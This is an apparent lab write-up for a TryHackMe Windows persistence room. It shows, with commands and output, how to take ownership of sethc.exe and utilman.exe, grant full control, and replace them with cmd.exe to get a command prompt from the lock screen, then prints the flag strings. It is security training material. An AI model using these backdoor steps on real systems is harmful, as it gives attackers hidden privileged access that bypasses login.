# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/06/2023

# Stickey Keys
1. Started this room's machine
2. `takeown /f c:\Windows\System32\sethc.exe` from the compromised Windows machine to take ownership, which we're doing as Administrator, of the **sethc.exe** (Secure Attention Sequence Even Handler Controller) program, which is associated with the Stickey Keys feature in Windows that you can activate by pressing the **SHIFT** key on a keyboard five times if it's active
```PowerShell
C:\Users\Administrator>takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "WPERSISTENCE\Administrator".
```
3. `icacls C:\Windows\System32\sethc.exe /grant Administrator:F` from the compromised Windows machine to grant the Administrator full control to the **sethc.exe** program, which allowed us to modify the executable binary that will execute after activating Sticky Keys by pressing the **SHIFT** key on our keyboard five times
```PowerShell
C:\Users\Administrator>icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files
```
4. `copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe` from the compromised Windows machine to replace the **sethc.exe** file with the **cmd.exe** file so that when the user activates Sticky Keys, it'll execute the **cmd.exe** program instead, which will launch the compromised Windows machine's Command Prompt that we'll use to execute the **flag14.exe** program 
```PowerShell
C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): Yes
        1 file(s) copied.
```
5. After successfully executing the preceding commands, we'll lock our screen and then active Sticky Keys by pressing **SHIFT** five times on our keyboard, which ended up opening a Command Prompt 

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt.2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt.3.png) 

6. `C:\flags\flag14.exe` from our open Command Prompt on the compromised Windows machine to execute the **flag14.exe** program, which ended up displaying the flag for this task onto our terminal 
```PowerShell
C:\Windows\system32>C:\flags\flag14.exe
THM{BREAKING_THROUGH_LOGIN}
```

# Utilman
1. Started this room's machine
2. `takeown /f c:\Windows\System32\utilman.exe` from the compromised Windows machine to take ownership of, which we're doing as Administrator, the **utilman.exe** program
```PowerShell
C:\Users\Administrator>takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "WPERSISTENCE\Administrator".
```
3. `icacls C:\Windows\System32\utilman.exe /grant Administrator:F`
```PowerShell
C:\Users\Administrator>icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files
```
4. `copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`
```PowerShell
C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): Yes
        1 file(s) copied.
```
5. Lock your screen and click on the "**Ease of Access**" button, and `whoami`

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt.2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Utilman%20pt2.png)

7. `C:\flags\flag15.exe`
```PowerShell
C:\Windows\system32>C:\flags\flag15.exe
THM{THE_LOGIN_SCREEN_IS_MERELY_JUST_A_SUGGESTION}
```
